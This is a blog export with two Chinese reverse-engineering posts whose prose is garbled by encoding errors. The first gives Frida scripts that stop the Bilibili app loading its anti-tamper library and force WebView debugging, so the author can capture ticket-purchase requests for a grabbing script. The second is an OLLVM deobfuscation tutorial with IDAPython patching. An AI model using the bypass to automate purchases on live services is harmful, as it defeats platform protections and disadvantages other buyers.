{"meta":{"title":"oaciaã®BbBlog~","subtitle":"DEVIL or SWEET","description":"æœˆé‡ä»äº‘ èŠ±é‡å’Œé£","author":"oacia","url":"https://oacia.dev","root":"/"},"pages":[],"posts":[{"title":"bç«™appæ¼«å±•æŠ¢ç¥¨","slug":"bilibili-get-ticket","date":"2024-07-13T10:14:21.000Z","updated":"2024-07-13T15:09:39.000Z","comments":true,"path":"bilibili-get-ticket/","link":"","permalink":"https://oacia.dev/bilibili-get-ticket/","excerpt":"","text":"# å‰è¨€ æœ€è¿‘èŒç”Ÿäº†æƒ³å»æ¼«å±•çš„æƒ³æ³•ï¼Œæ¯•ç«Ÿè¿™ä¹ˆä¹…äº†è¿˜æ²¡æœ‰å»è¿‡ä¸€æ¬¡æ¼«å±•å˜ï¼Œå¬è¯´ cp30 å¥½åƒä¸é”™ï¼Œä¸è¿‡é—®é¢˜å°±æ˜¯ç¥¨ç‰¹åˆ«çš„éš¾æŠ¢ğŸ˜” è¶ç°åœ¨ cp30 ä¹°ç¥¨è¿˜æ²¡å¼€å§‹ï¼Œä»Šå¤©ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„äº‹æƒ…ï¼Œæ‰€ä»¥å°±ç®€å•åˆ†æäº†ä¸€ä¸‹ b ç«™çš„ appï¼Œå†™äº†ä¸ªæŠ¢ç¥¨è„šæœ¬è‡ªå¨±è‡ªä¹ä¸€ä¸‹ æ„Ÿè§‰è¿™ä¸ª app è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œå®ƒæŠŠä¸»è¦çš„ webview ä¸šåŠ¡é€»è¾‘æ”¾åˆ°å­è¿›ç¨‹é‡Œè¿è¡Œæˆ‘è§‰å¾—è¿˜æ˜¯å¾ˆä¸é”™æ»´ï¼Œè¿™æ · frida æ³¨å…¥åˆ°ä¸»è¿›ç¨‹å°± hook ä¸åˆ°äº†ï¼ˆæˆ‘å°±è¢«å¡äº†å¿«ä¸€ä¸ªå°æ—¶ï¼ï¼‰ ä½†è¿™ä¸ªæŠ¢ç¥¨è„šæœ¬å†™çš„ç›¸å½“çš„ç®€é™‹ï¼Œæˆ‘å°±ä¸å¥½æ„æ€æ”¾å‡ºæ¥å•¦ğŸ˜‚ä¸è¿‡ç›¸ä¿¡å¤§å®¶åœ¨ github ä¸Šåº”è¯¥å¯ä»¥æ‰¾åˆ°æ›´åŠ å®Œå–„çš„é¡¹ç›®å§ :) è¿˜æœ‰å°±æ˜¯ä¸ºä»€ä¹ˆä¸ç›´æ¥å» b ç«™ä¼šå‘˜è´­ç½‘é¡µç«¯åˆ†æå‘¢ï¼Œè¿™æ ·è´­ç¥¨æ¥å£ä¸æ˜¯ä¸€ä¸‹å­å°±çœ‹åˆ°äº†å˜›å°±ä¸éœ€è¦ç»•å„ç§æ£€æµ‹äº† just for fun! # åŸºæœ¬ä¿¡æ¯ åŒ…å: tv.danmaku.bili å…¥å£: tv.danmaku.bili.MainActivityV2 # frida åè°ƒè¯• å…ˆçœ‹çœ‹ä¼šå‘˜è´­é¡µé¢æ˜¯å“ªä¸€ä¸ª activity çš„ PS D:\\work\\analysis\\bilibili> adb shell \"dumpsys activity top | grep ACTIVITY\" ACTIVITY com.google.android.apps.nexuslauncher/.NexusLauncherActivity ad36d3f pid=2139 ACTIVITY tv.danmaku.bili/.MainActivityV2 e753a0a pid=12505ç”¨ frida å†™ä¸ªç®€å•çš„ hook è„šæœ¬æ³¨å…¥è¿›å»çœ‹çœ‹æƒ…å†µ function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"com.mall.ui.page.base.MallWebFragmentLoaderActivity\"); activity.onCreate.overload('android.os.Bundle').implementation = function(x)&#123; const retv = this.onCreate(x); return retv; &#125; &#125;)&#125;setImmediate(hook,0);oriole:/data/local/tmp # /data/local/tmp/fs16.3.3 -l 0.0.0.0:1234adb forward tcp:1234 tcp:1234frida -H 127.0.0.1:1234 -l .\\hook.js -f tv.danmaku.biliæ³¨å…¥è¿›å»ä¹‹åä¸å‡ºæ„æ–™çš„å¡åœ¨ä¸»ç•Œé¢ä¸åŠ¨äº† å»çœ‹çœ‹æ˜¯åœ¨å“ªä¸€ä¸ª so å¡ä½çš„ function hook_dlopen() &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); console.log(\"load \" + path); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen)å“ˆå“ˆæ²¡æƒ³åˆ°æ˜¯ libmsaoaidsec.so , è¿™ä¸ª so æˆ‘åœ¨å¾ˆå¤šçš„ apk é‡Œé¢éƒ½çœ‹åˆ°è¿‡äº†ï¼ŒæŒ‰ç…§ä»¥å‰é€†å‘çš„ç»éªŒè¿™ä¸ª so é‡Œé¢æ²¡æœ‰ä»»ä½•çš„ä¸šåŠ¡ä»£ç ï¼Œåœ¨ init_proc é‡Œé¢æ˜¯çº¯çš„æ£€æµ‹é€»è¾‘ æˆ‘å¯¹ libmsaoaidsec.so é‡Œé¢çš„æ§åˆ¶æµå¹³å¦åŒ–è¿˜æ˜¯å¾ˆæ„Ÿå…´è¶£çš„ï¼Œä¹‹åä¼šå»ä¸“é—¨åˆ†æä¸€ä¸‹è¿™ä¸ª so:) ç°åœ¨æˆ‘ä»¬å°±ç”¨æœ€ç®€å•çš„æ–¹æ³•å»åè°ƒè¯•å¥½å•¦ï¼Œå°±æ˜¯ä¸è®© app åŠ è½½è¿™ä¸ª so, å…·ä½“åšæ³•å°±æ˜¯åœ¨æ‰“å¼€è¿™ä¸ª so æ—¶ï¼ŒæŠŠè¦åŠ è½½çš„ so çš„å­—ç¬¦ä¸²ç½®ç©º function hook_dlopen() &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if(path.indexOf('libmsaoaidsec.so') >= 0)&#123; ptr(pathptr).writeUtf8String(\"\"); &#125; console.log(\"load \" + path); &#125; &#125; &#125;);&#125;setImmediate(hook_dlopen_anti)å†æ¬¡æ³¨å…¥ä»£ç ä¹‹åå°± hook æˆåŠŸäº† # webview chrome è°ƒè¯• ç”¨ Device Monitor çœ‹ä¸€ä¸‹è´­ç¥¨çš„é¡µé¢ï¼Œå‘ç°æ˜¯å¥—äº†ä¸€ä¸ª WebView æƒ³è¦åœ¨ android ä¸­ä½¿ç”¨ chrome çš„ devtool å¼€å¯ webview debug, éœ€è¦æ³¨å…¥ä¸‹é¢çš„ frida è„šæœ¬ function webview_debug() &#123; Java.perform(function () &#123; var WebView = Java.use('android.webkit.WebView'); WebView.$init.overloads.forEach(function(init) &#123; init.implementation = function() &#123; // è°ƒç”¨åŸå§‹æ„é€ æ–¹æ³• var instance = init.apply(this, arguments); // æ‰“å¼€ WebView çš„è°ƒè¯•åŠŸèƒ½ WebView.setWebContentsDebuggingEnabled(true); console.log('[*] WebView debug open~'); // è¿”å›å®ä¾‹ return instance; &#125;; &#125;); &#125;);&#125;ç„¶åä½¿ç”¨ USB å°†ç”µè„‘å’Œæ‰‹æœºç›¸è¿ åœ¨ç”µè„‘ç«¯çš„ chrome æ‰“å¼€ chrome://inspect/#devices ä¹‹åæˆ‘ä»¬ç‚¹å‡»è¿™ä¸ª Port forwarding æŒ‰é’®é…ç½®ç«¯å£è½¬å‘ ç„¶å é€‰ä¸€ä¸ªç«¯å£ç‚¹å‡» Done ä½†æ˜¯è¿™æ ·åšå¹¶æ²¡æœ‰ä»€ä¹ˆç½‘é¡µå¯ä»¥ inspect é€šè¿‡ device monitor æ¥çœ‹ï¼Œè¿™ä¸ª b ç«™è‚¯å®šæ˜¯è°ƒç”¨äº† Webview çš„ï¼Œé‚£ä¸ºä»€ä¹ˆè¿™ä¸ªè„šæœ¬æ²¡æœ‰ hook åˆ° Webview çš„åˆ›å»ºå‘¢ï¼Ÿæˆ‘è§‰å¾—å¯èƒ½çš„åŸå› å°±æ˜¯ webview å¹¶ä¸æ˜¯åœ¨ä¸»è¿›ç¨‹è¢«åˆ›å»ºçš„ï¼Œè€Œæ˜¯åœ¨å­è¿›ç¨‹è¢«åˆ›å»ºçš„ï¼Œæˆ‘ä»¬æ‰“å°ä¸€ä¸‹ bilibili å»ºç«‹çš„è¿›ç¨‹æ¥çœ‹çœ‹æƒ…å†µ çš„ç¡®ï¼Œé™¤äº†ä¸»è¿›ç¨‹ä¹‹å¤–ï¼Œè¿˜å¤šäº†å…¶ä»–çš„å››ä¸ªè¿›ç¨‹ï¼Œæ„Ÿè§‰è¿™ä¸ª web è¿›ç¨‹å¾ˆå¯ç–‘å‘€ é‚£å†™ä¸ª python è„šæœ¬è®© frida ä¹Ÿå»æ³¨å…¥è¿™ä¸ª tv.danmaku.bili:web å­è¿›ç¨‹å¥½å•¦ import codecsimport fridaimport sysimport threadingdevice = frida.get_device_manager().add_remote_device(\"127.0.0.1:1234\")pending = []sessions = []scripts = []event = threading.Event()jscode = open('./hook.js', 'r', encoding='utf-8').read()pkg = \"tv.danmaku.bili\" #åŒ…ådef spawn_added(spawn): event.set() if spawn.identifier == pkg or spawn.identifier == f\"&#123;pkg&#125;:web\": print('spawn_added:', spawn) session = device.attach(spawn.pid) script = session.create_script(jscode) script.on('message', on_message) script.load() device.resume(spawn.pid)def spawn_removed(spawn): print('spawn_removed:', spawn) event.set()def on_message(spawn, message, data): print('on_message:', spawn, message, data)def on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)device.on('spawn-added', spawn_added)device.on('spawn-removed', spawn_removed)device.enable_spawn_gating()event = threading.Event()print('Enabled spawn gating')pid = device.spawn([pkg])session = device.attach(pid)print(\"[*] Attach Application id:\", pid)device.resume(pid)sys.stdin.read()è¿™æ ·å°± hook åˆ°å­è¿›ç¨‹å•¦ æ‰“å¼€äº† webview çš„ debug ä¹‹åï¼Œç»ˆäºå¯ä»¥ inspect äº†ï¼ ä¹‹åçš„è¿‡ç¨‹å°±å¾ˆç®€å•å•¦ ç‚¹å‡»æ¼«å±•è¯¦æƒ…ï¼ŒæŠ“ä¸ªåŒ… ç‚¹å‡»ç«‹å³è´­ç¥¨ï¼ŒæŠ“ä¸ªåŒ… ç‚¹å‡»æäº¤è®¢å•ï¼ŒæŠ“ä¸ªåŒ… æˆ‘å†™äº†ä¸€ä¸ªå°è„šæœ¬è¿˜æŒºå¥½ç”¨çš„ï¼Œç”¨è¿™ä¸ª js è„šæœ¬å¯ä»¥è¯»å–å‰ªåˆ‡æ¿é‡Œçš„ curl è¯·æ±‚å¹¶è½¬æ¢ä¸º python çš„ request è¯·æ±‚å¤åˆ¶åˆ°å‰ªåˆ‡æ¿ä¸Š :) å‰ªåˆ‡æ¿é‡Œçš„ curl è¯·æ±‚æ˜¯ä»è¿™é‡Œæ¥çš„ è®°å¾—å®‰è£…ä¸€ä¸‹åŒ…å°±å¥½äº† npm i curlconverternpm i copy-pasteimport * as curlconverter from 'curlconverter';import ncp from 'copy-paste'let cmd = ncp.paste()var res = curlconverter.toPython(cmd);console.log(res)ncp.copy(res, function () &#123; console.log(\"OK\")&#125;)åˆ†æä¸€ä¸‹æ¥å£ï¼Œå†™ä¸€ä¸‹è„šæœ¬å°±æŠ¢ç¥¨æˆåŠŸå•¦ waiting for cp30!","categories":[],"tags":[]},{"title":"ollvmä¸‰ç§æ··æ·†æ¨¡å¼çš„åæ··æ·†æ€è·¯","slug":"ollvm-study","date":"2024-07-12T01:24:52.000Z","updated":"2024-07-19T17:26:08.388Z","comments":true,"path":"ollvm-study/","link":"","permalink":"https://oacia.dev/ollvm-study/","excerpt":"","text":"ollvm ç®—æ˜¯æ—¥å¸¸é€†å‘çš„è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªéš¾ç‚¹ï¼Œè¯•æƒ³ä¸€ä¸‹å½“ä½ æŠŠç¨‹åºæ‹–è¿› ida åé‚£æ— ç©·æ— å°½çš„ block å‡ºç°åœ¨é¢å‰çš„æ„Ÿå—ï¼Œè¿™æ»‹å‘³ä¸€è¨€éš¾å°½å‘â€¦ æ‰€ä»¥å¾ˆæœ‰å¿…è¦å¯¹ ollvm çš„æ··æ·†ä¸åæ··æ·†è¿›è¡Œç³»ç»Ÿçš„å­¦ä¹ ï¼Œä»¥ä¾¿åœ¨æœªæ¥å®é™…ç”Ÿæ´»ä¸­é‡åˆ°æ—¶ï¼Œä¸å¿…æ…Œå¿™çš„å» google å¯»æ‰¾ç­”æ¡ˆ. æ–‡ä¸­çš„åˆ†ææ‰€ç”¨åˆ°çš„é™„ä»¶å¯ä»¥ç‚¹è¿™é‡Œä¸‹è½½å“¦ ollvm_bcf-fla-sub.zip # é¢„å¤‡çŸ¥è¯† llvm æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¼–è¯‘å™¨æ¶æ„ï¼Œä½œç”¨å¯ä»¥ç†è§£ä¸ºåˆ¶ä½œä¸€ä¸ªç¼–è¯‘å™¨ï¼Œllvm å…ˆå°†æºç ç”Ÿæˆä¸ºä¸ç›®æ ‡æœºå™¨æ— å…³çš„ LLVM IR ä»£ç ï¼Œç„¶åæŠŠ LLVMIR ä»£ç å…ˆä¼˜åŒ–ï¼Œå†å‘ç›®æ ‡æœºå™¨çš„æ±‡ç¼–è¯­è¨€è€ŒåŠªåŠ›ã€‚ç»å…¸ç¼–è¯‘å™¨éƒ½å¯ä»¥åˆ†ä¸ºå‰ç«¯ã€ä¸­å±‚ä¼˜åŒ–å’Œåç«¯ï¼š ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ° clang æ˜¯å‰ç«¯çš„ä¸€ä¸ªå¥—ä»¶ï¼Œä½†åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬åªå¯ä»¥æ„Ÿå—åˆ° clangï¼Œä¹Ÿåªæ˜¯åœ¨ä½¿ç”¨ clangï¼Œå› ä¸ºç¼–è¯‘çš„æ—¶å€™ï¼Œæ˜¯è°ƒç”¨ clang æˆ– clang++ æ¥ç¼–è¯‘æºç ã€‚ è€Œ ollvm æ˜¯åŸºäº LLVM çš„ä»£ç åˆ†æ”¯çš„ä»£ç æ··æ·†ï¼Œåœ¨ä¸­é—´è¡¨ç¤º IR å±‚ï¼Œé€šè¿‡ç¼–å†™ passï¼ˆéå†ä¸€é IRï¼Œå¯ä»¥åŒæ—¶å¯¹å®ƒåšä¸€äº›æ“ä½œï¼‰æ¥æ··æ·† IRï¼Œè¿™æ ·ç›®æ ‡æœºå™¨çš„æ±‡ç¼–è¯­è¨€ä¹Ÿå°±è¢«æ··æ·†äº† # ollvm ç¯å¢ƒæ­å»º ollvm æ­å»ºçš„ç¯å¢ƒä¸º ubuntu22.04 # ä¸‹è½½ ollvm 4.0 æºç  git clone -b llvm-4.0 --depth=1 https://github.com/obfuscator-llvm/obfuscator.git# å®‰è£… docker sudo apt install docker.io# å®‰è£…ç¼–è¯‘ ollvm çš„ docker ç¯å¢ƒ sudo docker pull nickdiego/ollvm-build# ç¼–è¯‘ ollvm # ä¸‹è½½ç¼–è¯‘è„šæœ¬ git clone --depth=1 https://github.com/oacia/docker-ollvm.git# ç¼–è¯‘ ollvm-build.sh åé¢è·Ÿçš„å‚æ•°æ˜¯ ollvmçš„æºç ç›®å½• sudo docker-ollvm/ollvm-build.sh /home/oacia/Desktop/obfuscator/# åˆ›å»ºç¡¬é“¾æ¥ sudo ln ./obfuscator/build_release/bin/* /usr/bin/åˆ›å»ºå®Œæˆç¡¬é“¾æ¥åï¼Œä½¿ç”¨è¯¥å‘½ä»¤æ¥æ£€æµ‹ clang æ˜¯å¦å¯ç”¨ clang --version# ä½¿ç”¨æµ‹è¯•ä»£ç å°è¯•ç¼–è¯‘ ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ RC4 åŠ å¯†æ¥ä½œä¸ºæµ‹è¯•ä»£ç ï¼Œ è¯¥ä»£ç å°†åœ¨åç»­ ollvm çš„ä¸‰ç§æ··æ·†ä¸­ç»§ç»­ä½¿ç”¨ //test.c#include&lt;stdio.h>/*RC4 åˆå§‹åŒ–å‡½æ•°*/void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i &lt; 256; i++) &#123; s[i] = i; k[i] = key[i % Len_k]; &#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; &#125;&#125;/*RC4 åŠ è§£å¯†å‡½æ•°unsigned char* Data åŠ è§£å¯†çš„æ•°æ®unsigned long Len_D åŠ è§£å¯†æ•°æ®çš„é•¿åº¦unsigned char* key å¯†é’¥unsigned long Len_k å¯†é’¥é•¿åº¦*/void RC4(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) // åŠ è§£å¯†&#123; unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k &lt; Len_D; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; &#125;&#125;void RC4encrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;void RC4decrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;int main()&#123; // å­—ç¬¦ä¸²å¯†é’¥ unsigned char key[] = \"secret\"; unsigned long key_len = sizeof(key) - 1;// å­—ç¬¦ä¸²æœ€åè¿˜æœ‰ä¸€ä¸ª '/0' æ‰€ä»¥éœ€è¦ - 1 // æ•°ç»„å¯†é’¥ //unsigned char key[] = &#123;'s','e','c','r','e','t'&#125;; //unsigned long key_len = sizeof(key); unsigned char data[] = &#123; 116, 104, 105, 115, 32, 105, 115, 32, 82, 67, 52, 44, 111, 97, 99, 105, 97 &#125;; // å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯† RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%d, \", data[i]); &#125; printf(\"\\n\"); // å¯¹å¯†æ–‡è¿›è¡Œè§£å¯† RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%c\", data[i]); &#125; printf(\"\\n\"); return 0;&#125;/*153, 94, 187, 111, 162, 205, 165, 134, 96, 136, 143, 240, 156, 135, 150, 94, 204,this is RC4,oacia*/è¿è¡Œå¦‚ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ clang test.c -o test å¦‚æœæç¤º fatal error: â€˜stdio.hâ€™ file not found â€‹ å°è¯•ä¸‹è½½ g++ å’Œ gcc sudo apt-get install g++sudo apt-get install gcc å¦‚æœæç¤º fatal error: 'stddef.hâ€™æˆ–è€…â€™stdarg.hâ€™ç­‰ file not found ä½¿ç”¨è¯¥å‘½ä»¤å¤åˆ¶ clang æ‰€éœ€çš„å¤´æ–‡ä»¶åˆ° /usr/include/ , cp -r -i åé¢è·Ÿçš„å‚æ•°ä¸º ollvmçš„æºç ç›®å½•/build_release/lib/clang/4.0.1/include/. , è¿™ä¸ªæ–‡ä»¶å¤¹å†…åŒ…å«äº† clang ç¼–è¯‘å™¨æ‰€éœ€çš„å¤´æ–‡ä»¶ cp -r -i /home/oacia/Desktop/obfuscator/build_release/lib/clang/4.0.1/include/. /usr/include/å¦‚æœæç¤ºæœ‰é‡åæ–‡ä»¶çš„è¯ï¼Œæœ€å¥½å…ˆå¯¹ /usr/include å†…çš„é‡åæ–‡ä»¶ä½œå¥½å¤‡ä»½ï¼Œç„¶åå»æ‰ -i å‚æ•°é‡æ–°è¿›è¡Œå¤åˆ¶å¤´æ–‡ä»¶æ“ä½œ # è™šå‡æ§åˆ¶æµ BCF (Bogus Control Flow) # åŸç† è™šå‡æ§åˆ¶æµæ··æ·†é€šè¿‡åŠ å…¥åŒ…å«ä¸é€æ˜è°“è¯çš„æ¡ä»¶è·³è½¬ï¼ˆä¹Ÿå°±æ˜¯è·³è½¬ä¸å¦åœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šçš„è·³è½¬ï¼Œä½† IDA æ— æ³•åˆ†æï¼‰å’Œä¸å¯è¾¾çš„åŸºæœ¬å—ï¼Œæ¥å¹²æ‰° IDA çš„æ§åˆ¶æµåˆ†æå’Œ F5 åæ±‡ç¼–ã€‚ æ‰€è°“çš„ä¸é€æ˜è°“è¯ï¼Œä¾‹å¦‚ if(x>10 &amp;&amp; x&lt;=10)&#123; goto Label1;&#125;å¯¹äºè¿™ç±»è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œ x&gt;10 &amp;&amp; x&lt;=10 æ˜¯æ°¸å‡å¼ï¼Œæ‰€ä»¥ goto Label1 è¿™ä¸ªè·³è½¬æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯å¯¹äº IDA æ¥è¯´å¯ä¸æ˜¯è¿™ä¸ªæ ·å­ï¼Œåœ¨é™æ€åˆ†æçš„æ—¶å€™ï¼ŒIDA å¹¶ä¸çŸ¥é“ x çš„å€¼æ˜¯å¤šå°‘ï¼Œæ‰€ä»¥è¯´è¿™ç±»è™šå‡æ§åˆ¶æµå°±ä¼šå¹²æ‰°æˆ‘ä»¬çš„é™æ€åˆ†æ. # ollvm çš„ BCF æ··æ·† ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯¹ä»£ç è¿›è¡Œ BCF æ··æ·† clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 test.c -o test-bcfå¯ç”¨é€‰é¡¹ï¼š -mllvm -bcf : æ¿€æ´»è™šå‡æ§åˆ¶æµ -mllvm -bcf_loop=3 : æ··æ·†æ¬¡æ•°ï¼Œè¿™é‡Œä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·† 3 æ¬¡ï¼Œé»˜è®¤ä¸º 1 -mllvm -bcf_prob=40 : æ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ï¼Œè¿™é‡Œæ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ä¸º 40%ï¼Œé»˜è®¤ä¸º 30 % å¯ä»¥å‘ç°åœ¨ BCF æ··æ·†ä¹‹åï¼Œå‡½æ•°çš„æ§åˆ¶æµæ˜æ˜¾å¤æ‚äº†è®¸å¤š æ‰“å¼€ BCF æ··æ·†ä¹‹å IDA çš„ä¼ªä»£ç ï¼Œå‘ç°å¤šäº†è®¸å¤šçš„ while , if è¡¨è¾¾å¼ï¼Œä¼ªä»£ç å˜å¾—ååˆ†å¤æ‚ï¼Œä¹Ÿè®©æˆ‘ä»¬æ— æ³•ä¸€çœ¼å°±å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä½•ç§åŠ å¯† # ollvm çš„ BCF åæ··æ·† é“ºå«äº†è¿™ä¹ˆé•¿çš„æ—¶é—´ï¼Œç»ˆäºè¦æ¥åˆ°æœ¬ç¯‡æ–‡ç« çš„ç¬¬ä¸€ä¸ªæœ‰è¶£çš„ç¯èŠ‚ï¼ŒBCF çš„åæ··æ·†äº† æˆ‘ä»¬å¾€ä¸Šçœ‹ while å†…çš„è¡¨è¾¾å¼ y_4 &gt;= 10 &amp;&amp; (((x_3 - 1) * x_3) &amp; 1) != 0 , åœ¨è¿™ä¸ªå¼å­ä¸­ï¼Œ (x_3 - 1) * x_3) çš„å€¼æ°¸è¿œä¸ºå¶æ•°ï¼Œæ‰€ä»¥ (x_3 - 1) * x_3) &amp; 1 æ°¸è¿œè¿”å› 0 , ä¸ç­‰å·å·¦è¾¹ y_4 &gt;= 10 &amp;&amp; (((x_3 - 1) * x_3) &amp; 1) , å› ä¸ºæ˜¯ç”¨é€»è¾‘ä¸ &amp;&amp; ä½œä¸ºè¿æ¥è¯ï¼Œæ‰€ä»¥å·¦ä¾§çš„è¡¨è¾¾å¼å…¶å®ä¸ºæ°¸å‡å¼ï¼Œ y_4 &gt;= 10 &amp;&amp; (((x_3 - 1) * x_3) &amp; 1) != 0 æ°¸è¿œä¸æˆç«‹ å¯¹äº BCF, æœ‰ 3 ç§æ€è·¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬å»è¿›è¡Œåæ··æ·† # æ€è·¯ä¸€ å°†å…¨å±€å˜é‡èµ‹å€¼å¹¶å°† segment è®¾ä¸ºåªè¯» IDA å…¶å®æ˜¯æœ‰æ­»ä»£ç æ¶ˆé™¤ (DCE, Dead Code Elimination) çš„ï¼Œä½†æ˜¯ç”±äº y_4 , x_3 è¢«å®šä¹‰ä¸ºäº†å…¨å±€å˜é‡ï¼Œåœ¨é™æ€åˆ†ææ—¶ï¼ŒIDA ä¸çŸ¥é“è¿™ä¸ªè¡¨è¾¾å¼çš„å€¼æ˜¯å¤šå°‘ï¼Œæ‰€ä»¥ IDA ä¹Ÿä¸æ•¢è½»æ˜“çš„å°±æŠŠè¿™æ®µä»£ç ç»™æ¶ˆé™¤äº† (ä¸‡ä¸€æŠŠé‡è¦çš„ä»£ç ä¹Ÿç»™æ¶ˆé™¤æ‰äº†é‚£é€†å‘äººå‘˜çœŸçš„è¦ *** äº†) ä½†æ˜¯å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªå˜é‡çš„å€¼å®šä¸‹æ¥ï¼Œå¹¶ä¸”å°†å˜é‡æ‰€åœ¨çš„ segment è®¾ä¸º åªè¯» ï¼Œé‚£è¿™ä¸ªå˜é‡å€¼åœ¨æ²¡è¿è¡Œå‰ä¹Ÿå˜ä¸äº†ï¼ŒIDA ä¸å°±å¯ä»¥è‡ªå·±ç®—å‡ºæ¥è¿™ä¸ªè¡¨è¾¾å¼çš„å€¼æ˜¯å¤šå°‘äº†å˜›ï¼Œè¿™æ ·é‚£äº›æ²¡æœ‰ç”¨çš„è·³è½¬ IDA å°±å¯ä»¥è‡ªåŠ¨ä¼˜åŒ–äº† æ‰€ä»¥æˆ‘ä»¬å…ˆåŒå‡» x_3 è·³è½¬åˆ° x_3 çš„åœ°å€ ç„¶åæŒ‰ä¸‹ Alt+S æˆ–è€… Edit-&gt;Segments-&gt;Edit segment... æ¥æ”¹å˜ä¸é€æ˜è°“è¯æ‰€åœ¨çš„ segment çš„è¯»å†™å±æ€§ï¼Œå¦‚å›¾å°† Write å¤é€‰æ¡†å–æ¶ˆå‹¾é€‰ï¼Œ .bssæ®µ å°±è®¾ä¸ºåªè¯»äº† å…‰æ˜¯è¿™æ ·è¿˜ä¸å¤Ÿï¼Œå› ä¸º .bssæ®µ ä¸­çš„å˜é‡è¿˜æ²¡æœ‰è¢«èµ‹è¿‡å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ patch è¿™ä¸ªæ®µæ¥å›ºå®š .bssæ®µ å†…å˜é‡çš„å€¼ ä¸€ä¸ªå˜é‡ä¸€ä¸ªå˜é‡å» patch æ˜¾ç„¶æ˜¾å¾—æœ‰äº›éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç¼–å†™ IDApython è„šæœ¬æ¥å®ç°ä¸€æ­¥åˆ°ä½çš„æ•ˆæœï¼Œå¹¶ä¸”å¯¹äºå¸¸è§„çš„ ollvm çš„ bcf æ··æ·†æ¥è¯´ï¼Œbcf çš„ä¸é€æ˜è°“è¯éƒ½æ˜¯å¤„äº .bssæ®µ ä¸­ã€‚å¦‚æœä¸é€æ˜è°“è¯å®šä¹‰åœ¨å…¶ä»–æ®µä¸­ï¼Œå°† IDApython ä¸­çš„ä»£ç åšå‡ºç›¸å¯¹åº”çš„ä¿®æ”¹å³å¯ import ida_segmentimport ida_bytesseg = ida_segment.get_segm_by_name('.bss')for ea in range(seg.start_ea, seg.end_ea,4): ida_bytes.patch_bytes(ea, int(2).to_bytes(4,'little'))'''seg.perm: ç”±ä¸‰ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤º,ä¾‹å¦‚ä¸€ä¸ªsegmentä¸ºå¯è¯»,ä¸å¯å†™,ä¸å¯æ‰§è¡Œ,åˆ™seg.perm = 0b100(seg.perm >> 2)&amp;1: Read(seg.perm >> 1)&amp;1: Write(seg.perm >> 0)&amp;1: Execute'''seg.perm = 0b100# æ€è·¯äºŒ ä½¿ç”¨ d810 å»é™¤ BCF d810 ä¸­å†…ç½®äº†å¾ˆå¤šçš„ä¸é€æ˜è°“è¯è¡¨è¾¾å¼ï¼Œå®ƒçš„åŒ¹é…å™¨ä¹Ÿæ˜¯éå¸¸çš„å‰å®³å®Œå…¨å¯ä»¥åšåˆ°å»é™¤è™šå‡æ§åˆ¶æµ åœ¨ Edit-&gt;plugins-&gt;D-810 æ‰“å¼€ä¹‹åï¼Œé€‰æ‹© default_unflattening_switch_case.json ä¹‹åç‚¹å‡» start , å³å¯åšåˆ°å¯¹ä¸é€æ˜è°“è¯çš„å»é™¤å¹¶è¿˜åŸæ§åˆ¶æµ è¿˜åŸåçš„æ•ˆæœå¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°å’ŒåŸæœ¬çš„ä»£ç åŸºæœ¬æ˜¯ä¸€æ ·çš„äº† 